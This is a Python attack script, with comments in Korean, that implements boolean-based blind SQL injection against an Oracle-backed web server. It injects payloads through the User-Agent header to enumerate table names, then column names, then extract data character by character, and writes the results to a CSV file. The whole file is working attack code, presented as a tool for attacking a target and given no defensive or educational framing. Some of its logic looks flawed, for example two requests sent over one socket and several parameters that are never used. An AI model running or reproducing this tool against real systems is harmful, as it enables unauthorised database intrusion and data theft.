import socket
import time
import csv
from datetime import datetime

class BlindSQLInjector:
    def __init__(self, target_params):
        self.server = target_params['server']
        self.port = target_params['port']
        self.delay = target_params['delay']
        self.threshold = target_params['threshold']
        self.retries = target_params['retries']
        self.success_payloads = []
        self.failure_payloads = []

    def baseline(self):
        """서버의 기본 응답 시간을 측정하여 기준으로 사용"""
        total_time = 0
        trials = 5
        for _ in range(trials):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    s.connect((self.server, self.port))
                    start = time.time()
                    request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\n\r\n".encode()
                    s.sendall(request)
                    s.recv(100)
                    total_time += (time.time() - start)
            except Exception as e:
                print("기본 응답 시간 측정 실패:", e)
                continue
        baseline_time = total_time / trials
        print(f"기본 응답 시간: {baseline_time:.2f}초")
        return baseline_time

    def boolean_based_blind_injection(self, true_query, false_query):
        """Boolean 기반 블라인드 SQL 인젝션"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(5)
                s.connect((self.server, self.port))

                true_request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {true_query}\r\n\r\n"
                s.sendall(true_request.encode())
                true_response = s.recv(100)

                false_request = f"GET / HTTP/1.1\r\nHost: {self.server}\r\nUser-Agent: {false_query}\r\n\r\n"
                s.sendall(false_request.encode())
                false_response = s.recv(100)

                print(f"응답 비교 - 참 응답: {true_response}, 거짓 응답: {false_response}")
                return true_response != false_response
        except Exception as e:
            print("Boolean 기반 인젝션 실패:", e)
            return False

    def extract_tables(self):
        """데이터베이스의 테이블 이름 추출"""
        tables = []
        print("데이터베이스에서 테이블 추출을 시작합니다...")
        for i in range(1, 21):
            table_name = ""
            for j in range(1, 21):
                found = False
                for ascii_code in range(32, 127):
                    true_query = f"' AND ASCII(SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM={i}), {j}, 1)) = {ascii_code}--"
                    false_query = true_query.replace(f"= {ascii_code}", f"!= {ascii_code}")

                    if self.boolean_based_blind_injection(true_query, false_query):
                        table_name += chr(ascii_code)
                        print(f"테이블 이름 {i} - {j}번째 문자 추출 성공: '{chr(ascii_code)}'")
                        found = True
                        break
                
                if not found:
                    if table_name:
                        tables.append(table_name)
                    break
        print("테이블 추출 완료.")
        return tables

    def extract_columns(self, table_name):
        """특정 테이블 내의 컬럼명 추출"""
        columns = []
        print(f"테이블 '{table_name}'에서 컬럼을 추출합니다...")
        for i in range(1, 21):
            column_name = ""
            for j in range(1, 21):
                found = False
                for ascii_code in range(32, 127):
                    true_query = f"' AND ASCII(SUBSTR((SELECT column_name FROM user_tab_columns WHERE table_name='{table_name}' AND ROWNUM={i}), {j}, 1)) = {ascii_code}--"
                    false_query = true_query.replace(f"= {ascii_code}", f"!= {ascii_code}")
                    
                    if self.boolean_based_blind_injection(true_query, false_query):
                        column_name += chr(ascii_code)
                        print(f"컬럼 '{table_name}'의 {i}번째 - {j}번째 문자 추출 성공: '{chr(ascii_code)}'")
                        found = True
                        break

                if not found:
                    if column_name:
                        columns.append(column_name)
                    break
        print(f"컬럼 추출 완료: {columns}")
        return columns

    def extract_data(self, table_name, column_name):
        """테이블 내의 특정 컬럼 데이터를 하나씩 추출"""
        extracted_data = ""
        print(f"테이블 '{table_name}'의 컬럼 '{column_name}'에서 데이터 추출을 시작합니다...")
        for i in range(1, 21):
            char_found = False
            for ascii_code in range(32, 127):
                true_query = f"' AND ASCII(SUBSTR((SELECT {column_name} FROM {table_name} WHERE ROWNUM=1), {i}, 1)) = {ascii_code}--"
                false_query = true_query.replace(f"= {ascii_code}", f"!= {ascii_code}")
                
                if self.boolean_based_blind_injection(true_query, false_query):
                    extracted_data += chr(ascii_code)
                    print(f"'{column_name}'에서 {i}번째 문자 추출 성공: '{chr(ascii_code)}'")
                    char_found = True
                    break
            
            if not char_found:
                print(f"{column_name}에서 데이터 추출 완료.")
                break
        return extracted_data

    def run(self):
        """Blind SQL Injection 공격 시작 및 데이터 추출"""
        self.baseline()
        tables = self.extract_tables()
        results = []
        
        for table in tables:
            columns = self.extract_columns(table)
            for column in columns:
                extracted_result = self.extract_data(table, column)
                if extracted_result:
                    results.append({"table": table, "column": column, "data": extracted_result})
        
        self.save_results(results)

    def save_results(self, results):
        """결과를 CSV 파일로 저장"""
        filename = f"blind_sql_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        try:
            with open(filename, mode='w', newline='', encoding='utf-8-sig') as file:
                writer = csv.writer(file)
                writer.writerow(["테이블명", "컬럼명", "추출 데이터"])
                for result in results:
                    writer.writerow([result["table"], result["column"], result["data"]])
            print(f"데이터가 {filename} 파일에 저장되었습니다.")
        except Exception as e:
            print("결과 저장 중 오류 발생:", e)

# 실제 공격 대상 파라미터
target_params = {
    'server': 'localhost',
    'port': 8080,
    'delay': 1,
    'threshold': 0.5,
    'retries': 5
}

if __name__ == "__main__":
    injector = BlindSQLInjector(target_params)
    print("DBMS에서 블라인드 SQL 인젝션 공격을 시작합니다...")
    injector.run()
    print("블라인드 SQL 인젝션 공격이 완료되었습니다.")
